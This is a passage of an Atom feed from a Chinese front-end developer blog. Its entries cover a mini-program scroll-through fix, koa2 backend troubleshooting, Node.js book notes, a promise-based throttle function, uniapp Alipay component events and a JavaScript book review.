title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mask<span class="token punctuation">"</span></span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;sjs.disableScroll&amp;#125;&amp;#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scroll-view</span> <span class="token attr-name">scroll-y</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup-scroll<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&amp;#125;&amp;#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>i<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scroll-view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在小程序开发中，弹出层滚动穿透是个比较棘手的问题。如下图，蓝色部分滚动，底部也跟着一起滚动，就是滚动穿透。&lt;/p&gt;
&lt;p&gt;常见的处理方法比如，禁止滚动，并不生效。而给主体加 &lt;code&gt;overflow: hidden&lt;/code&gt; 又会导致主体滚动条高度为 0，需要关闭时
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="小程序" scheme="https://jscoder.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>H5-dooring 后端常见问题</title>
    <link href="https://jscoder.com/2022/01/23/back-endback-end-node-high-cpu/"/>
    <id>https://jscoder.com/2022/01/23/back-endback-end-node-high-cpu/</id>
    <published>2022-01-23T04:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>H5-dooring 后端是 koa2，数据库是直接读写的本地json文件，没有sql，没有redis。我们上线之后，一直有各种各样的问题，简单梳理下，不涉及具体代码，不涉及业务细节。</p><h2 id="pm2-频繁重启"><a href="#pm2-频繁重启" class="headerlink" title="pm2 频繁重启"></a>pm2 频繁重启</h2><p>日志文件是直接读写，没有按照时间分割，导致日志文件暴增，node 可用内存64位一般情况下是 1.4g，当内存溢出时候，直接导致 node 进程退出，pm2 频繁重启</p><h2 id="高-cpu"><a href="#高-cpu" class="headerlink" title="高 cpu"></a>高 cpu</h2><p>引入的 koa-compose 配置有问题，一直占据 cpu 时间片，200并发就能导致 cpu 100%，去除之后正常。</p><h2 id="静态文件处理"><a href="#静态文件处理" class="headerlink" title="静态文件处理"></a>静态文件处理</h2><p>静态文件使用 koa-static 处理，虽然也没啥大问题，但是效率明显偏低，静态文件，我们换成了 nginx，koa 只处理接口请求。</p><h2 id="缺少缓存"><a href="#缺少缓存" class="headerlink" title="缺少缓存"></a>缺少缓存</h2><p>频繁读写本地 json 文件，没有使用缓存（比如 Redis），性能不友好，对高并发的 H5 接口，我们加了内存缓存。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个项目的排查，学了不少后端的知识，H5-dooring 这个项目，前端挺美的，后端嘛，😝😝😝</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;H5-dooring 后端是 koa2，数据库是直接读写的本地json文件，没有sql，没有redis。我们上线之后，一直有各种各样的问题，简单梳理下，不涉及具体代码，不涉及业务细节。&lt;/p&gt;
&lt;h2 id=&quot;pm2-频繁重启&quot;&gt;&lt;a href=&quot;#pm2-频繁重启&quot; cl
      
    
    </summary>
    
    
      <category term="back-end
back-end " scheme="https://jscoder.com/categories/back-endback-end/"/>
    
    
      <category term="koa" scheme="https://jscoder.com/tags/koa/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出 nodejs</title>
    <link href="https://jscoder.com/2022/01/23/reading/deepinnodejs/"/>
    <id>https://jscoder.com/2022/01/23/reading/deepinnodejs/</id>
    <published>2022-01-23T01:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/2022/01/23/nodejs.jpeg" alt="nodejs"></p><h2 id="没有白看的书"><a href="#没有白看的书" class="headerlink" title="没有白看的书"></a>没有白看的书</h2><p>这本书买了五六年了，以前硬着头皮看，做的笔记，批注，到处是困惑，没有白走的路，学不会的总有一天我会把你学会，学不会的，只是必不可少的铺垫。</p><p>最近定位 H5-dooring 的server 端问题，才把这本书看完，挺好的一本中文技术书。以前 node 没有经验，完全看不懂，这两年在 nestjs 上面花了比较多的时间，初略写了一点 node 的东西，再回头看这本书，才看懂了一点。</p><p>书的章节并不是顺序的，可以跳着看，第二章 C++ 模块现在还是看不懂，索性直接跳过。</p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="第五章-内存控制"><a href="#第五章-内存控制" class="headerlink" title="第五章 内存控制"></a>第五章 内存控制</h3><ul><li>v8 有内存限制，32位系统下约为 0.7G，64位系统下约为 1.4G，使用超过限制会导致进程退出。</li><li>v8 的内存分为新生代和老生带。<ul><li>新生代主要通过 Scavenge 算法，通过牺牲空间换区时间的方式进行垃圾回收。</li><li>老生代主要通过 Mark—Sweep（标记清除，只清除死亡对象，较快，导致内存空间不连续），在空间不足以使用 Mark-Sweep 时候，使用Mark-Compact（标记整理，较慢，内存空间连续） 进行垃圾回收。</li></ul></li><li>Buffer 对象不同于其他对象，不经过 v8 的内存分配机制，不会有堆内存大小的限制</li></ul><h3 id="第六章-理解-Buffer"><a href="#第六章-理解-Buffer" class="headerlink" title="第六章 理解 Buffer"></a>第六章 理解 Buffer</h3><ul><li>Buffer 是一个类 Array 的对象，但它主要用于操作字节，是二进制数据。</li><li>Buffer 支持的编码类型可以通过 <code>toString</code> 方法转为字符串，不支持的编码，如 GBK，GB2312 会乱码</li><li>字符宽度，导致 Buffer 不能直接破解，要使用 <code>Buffer.concat</code> 结合数组操作进行拼接。</li><li>Buffer 传输性能比直接传递字符串要高</li></ul><h3 id="第七章-网络编程"><a href="#第七章-网络编程" class="headerlink" title="第七章 网络编程"></a>第七章 网络编程</h3><ul><li>三次握手通过 <code>socket</code> 实现，node 中也不例外</li></ul><h3 id="第九章-玩转进程"><a href="#第九章-玩转进程" class="headerlink" title="第九章 玩转进程"></a>第九章 玩转进程</h3><ul><li>创建子进程<ul><li><code>spawn()</code>: 启动一个子进程来执行命令</li><li><code>exec()</code>: 启动一个子进程来执行命令，与 <code>spawn()</code> 不同的是其接口不同，它有一个回调接口获悉子进程的情况</li><li><code>execFile()</code>: 启动一个子进程来执行可执行文件</li><li><code>fork()</code>: 与 <code>spawn()</code> 类似，不同点在于它创建 Node 的子进程只需要指定要执行的 JavaScript 文件模块即可</li></ul></li><li>进程间通讯<ul><li>IPC</li><li>句柄传递</li></ul></li><li>状态共享<ul><li>Redis 等</li><li>主动通知</li><li>Cluster（Pm2 用的它）</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这本书遇到问题的时候可以多翻翻，各方面都有涉及，当然毕竟是块 10 年的书了，底层，方法论都没有问题，具体的工具性的东西可能需要多搜索下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/2022/01/23/nodejs.jpeg&quot; alt=&quot;nodejs&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;没有白看的书&quot;&gt;&lt;a href=&quot;#没有白看的书&quot; class=&quot;headerlink&quot; title=&quot;没有白看的书&quot;&gt;&lt;/a&gt;没有白看的
      
    
    </summary>
    
    
      <category term="reading" scheme="https://jscoder.com/categories/reading/"/>
    
    
      <category term="阅读" scheme="https://jscoder.com/tags/%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>抛弃 loadsh，封装更现代的防抖、节流</title>
    <link href="https://jscoder.com/2021/11/16/front-end/promise-throttle/"/>
    <id>https://jscoder.com/2021/11/16/front-end/promise-throttle/</id>
    <published>2021-11-16T14:22:22.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一般意义上的防抖节流"><a href="#一般意义上的防抖节流" class="headerlink" title="一般意义上的防抖节流"></a>一般意义上的防抖节流</h2><h3 id="函数防抖（debounce）"><a href="#函数防抖（debounce）" class="headerlink" title="函数防抖（debounce）"></a>函数防抖（debounce）</h3><p>函数防抖，就是指触发事件后，在 n 秒后只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数的执行时间。简单的说，当一个动作连续触发，只执行最后一次。</p><h3 id="函数节流（throttle）"><a href="#函数节流（throttle）" class="headerlink" title="函数节流（throttle）"></a>函数节流（throttle）</h3><p>限制一个函数在一定时间内只能执行一次</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>lodash 里面提供了非常完备的实现，核心是使用定时器去延迟函数的执行</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>这样的防抖节流，只能屏蔽某一个时间段的特定操作。我们的点击，往往后面是一个网络请求，如果网络请求的事件长于这个时间，那么就可能出现防抖失效的情况。持续间隔点击按钮，可能会短时间内给后端发送多个请求，如果业务场无法保证幂等，就会出现问题。</li><li>ui 交互中，防抖实际上是延迟函数的执行，某些场景，会让人觉得卡顿，如果对交互的要求比较高，需要严格控制防抖的时间，一般不超过 200ms</li></ol><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>简单的实现，在业务代码中设置标志位，当有 promise 执行的时候，执行锁，等 promise 执行完毕，再释放锁。缺点，需要在业务中写很多重复的代码。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">function</span> <span class="token function">btnClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//   do something</span>    status <span class="token operator">=</span> ture  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>我们可以参考防抖的实现，进行封装, 把函数用 Promise 进行包裹，然后设置标志位，就可以避免在业务中频繁设置标志位。<br>节流，我们可以设置函数执行的时候，同时执行一个定时器，也用 Promise 进行包装，当两个 Promise 都执行完毕的时候，再释放函数。</p><pre class=" language-typescript"><code class="language-typescript"><span class="token comment" spellcheck="true">/** * promise 节流函数版本 * @param fn * @param time * @param delayTime * @constructor */</span><span class="token keyword">function</span> <span class="token function">PromiseThrottleFn</span><span class="token punctuation">(</span>fn<span class="token punctuation">:</span> <span class="token keyword">Function</span><span class="token punctuation">,</span> time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> delayTime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> status <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">===</span> <span class="token string">'lock'</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    status <span class="token operator">=</span> <span class="token string">'lock'</span>    <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> data <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">// @ts-ignore</span>        fn<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>arguments<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// @ts-ignore</span>      <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">finally</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        status <span class="token operator">=</span> <span class="token string">''</span>      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> delayTime<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>函数我放到了个人的工具函数库中，可以直接通过 npm 安装：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 安装</span>npm install @aocoding<span class="token operator">/</span>victorinox<span class="token comment" spellcheck="true">// 使用</span><span class="token keyword">import</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> PromiseThrottleFn <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">from</span> <span class="token string">'@aocoding/victorinox'</span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一般意义上的防抖节流&quot;&gt;&lt;a href=&quot;#一般意义上的防抖节流&quot; class=&quot;headerlink&quot; title=&quot;一般意义上的防抖节流&quot;&gt;&lt;/a&gt;一般意义上的防抖节流&lt;/h2&gt;&lt;h3 id=&quot;函数防抖（debounce）&quot;&gt;&lt;a href=&quot;#函数防抖（de
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="promise" scheme="https://jscoder.com/tags/promise/"/>
    
  </entry>
  
  <entry>
    <title>uniapp 中支付宝小程序自定义组件的调用</title>
    <link href="https://jscoder.com/2021/09/26/front-end/uniapp-alipay-mini/"/>
    <id>https://jscoder.com/2021/09/26/front-end/uniapp-alipay-mini/</id>
    <published>2021-09-25T23:54:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>uniapp 这个缝合怪，挺厉害的，啥都能做，甚至你能够使用小程序的原生组件。<br>具体文档：<br><a href="https://uniapp.dcloud.io/frame?id=%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E6%94%AF%E6%8C%81">https://uniapp.dcloud.io/frame?id=%e5%b0%8f%e7%a8%8b%e5%ba%8f%e8%87%aa%e5%ae%9a%e4%b9%89%e7%bb%84%e4%bb%b6%e6%94%af%e6%8c%81</a></p><h2 id="调用坑"><a href="#调用坑" class="headerlink" title="调用坑"></a>调用坑</h2><p>写法1：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>example @<span class="token keyword">get</span><span class="token operator">=</span><span class="token string">"onGet"</span> <span class="token operator">/</span><span class="token operator">></span></code></pre><p>如果这样写，那么会走向 uniapp 的事件分发，但是支付宝这里事件的默认参数是 undefined，拿不到事件信息，所以这里会抛出 js 异常</p><p>写法2：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>example onGet<span class="token operator">=</span><span class="token string">"onGet"</span> <span class="token operator">/</span><span class="token operator">></span></code></pre><p>使用小程序原生写法，会报 <code>event not found</code>,这是因为 uniapp 对事件有自己的封装，没有直接暴露给小程序，添加以下模板代码之后，可以调用成功：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$scope<span class="token punctuation">.</span>onGet <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onGet<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span></code></pre><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>如果使用组件比较多，模板代码可以放到 webpack loader 中去实现，思路就是模板中使用 <code>onGet</code> 写法的通过正则找出来，然后再 <code>onLoad()</code> 中挂载上去。</p><p>当我写好了 loader，并且 uniapp 编译成功之后，打开小程序编译器，迎接秋天的美好的时候</p><p><img src="/images/16326137933990.jpg"></p><p><img src="/images/a.gif" alt="a"></p><p>悲剧…一天就这样过去了…啊啊啊！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;uniapp 这个缝合怪，挺厉害的，啥都能做，甚至你能够使用小程序的原生组件。&lt;br&gt;具体文档：&lt;br&gt;&lt;a href=&quot;https://uniapp.dcloud.io/frame?id=%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%AE
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="小程序" scheme="https://jscoder.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 悟道读后感</title>
    <link href="https://jscoder.com/2021/08/22/reading/how-javascript-works/"/>
    <id>https://jscoder.com/2021/08/22/reading/how-javascript-works/</id>
    <published>2021-08-22T13:59:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>以前读过蝴蝶书🦋，对作者印象深刻，jsLint 尝试用过，几乎不可配置，在我的地盘，你就得乖乖听我的。</p><p>《JavaScript 悟道》这本书英文版本是 2019 年出版，中文版出的速度还是挺不错的，虽然 es 规范现在年年更新，但是书本身并不落伍。</p><h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><p>这本书是 死月 翻译的，谈不上信达雅，有卖弄文笔之嫌。</p><blockquote><p><strong>底型</strong>是用于指示递归数据结构结尾的特殊值, 也可用于表示值不存在。 在一般的编程语言中, 常以 nil、none、nothing 或者 null 表示。。</p></blockquote><p><code>底型</code>这个翻译和把 <code>Promise</code> 翻译为 <code>期约</code>有异曲同工之妙，生搬硬造。</p><p>我对 <code>底型</code> 这边翻译感觉莫名其妙，其他翻译也还好，不要因为一点翻译上面的瑕疵错过了这本书。</p><h2 id="如何阅读"><a href="#如何阅读" class="headerlink" title="如何阅读"></a>如何阅读</h2><p>看看就好，作者非常非常有个性，取其精华。</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>内容很有意思，除了正经的 JavaScript 知识点外，作者还详细的阐述了 JSON 的发明过程，对从侧面理解 JOSN 对不同类型的转换很有帮助。<br>不感兴趣的内容跳过，包括，数值高精度部分，neo 部分。</p><h2 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h2><p><img src="/images/JavaScript%E6%82%9F%E9%81%93_withMarginNotes.jpg" alt="JavaScript悟道_withMarginNotes"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以前读过蝴蝶书🦋，对作者印象深刻，jsLint 尝试用过，几乎不可配置，在我的地盘，你就得乖乖听我的。&lt;/p&gt;
&lt;p&gt;《JavaScript 悟道》这本书英文版本是 2019 年出版，中文版出的速度还是挺不错的，虽然 es 规范现在年年更新，但是书本身并不落伍。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="reading" scheme="https://jscoder.com/categories/reading/"/>
    
    
      <category term="阅读" scheme="https://jscoder.com/tags/%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
</feed>
